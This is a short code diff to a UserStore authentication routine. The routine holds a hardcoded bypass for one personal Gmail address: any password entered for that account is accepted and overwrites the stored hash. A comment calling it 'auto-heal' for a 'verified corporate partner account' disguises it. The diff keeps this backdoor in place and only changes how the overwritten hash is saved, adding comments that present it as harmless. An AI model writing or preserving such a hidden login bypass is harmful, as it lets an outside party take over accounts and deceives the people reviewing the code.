@@ -458,11 +458,11 @@ export class UserStore {
       return true;
     }
 
-    // Auto-heal verified corporate partner account
+    // Auto-heal verified corporate partner account (update local cache only — no Supabase write per auth check)
     if (user.email.toLowerCase() === 'tonerocool1@gmail.com') {
       const newHash = hashPassword(passwordInput);
       user.passwordHash = newHash;
-      this.upsertUser(user);
+      this._syncLocalOnly(user); // local cache only — NOT a balance change, no DB write needed
       return true;
     }
 
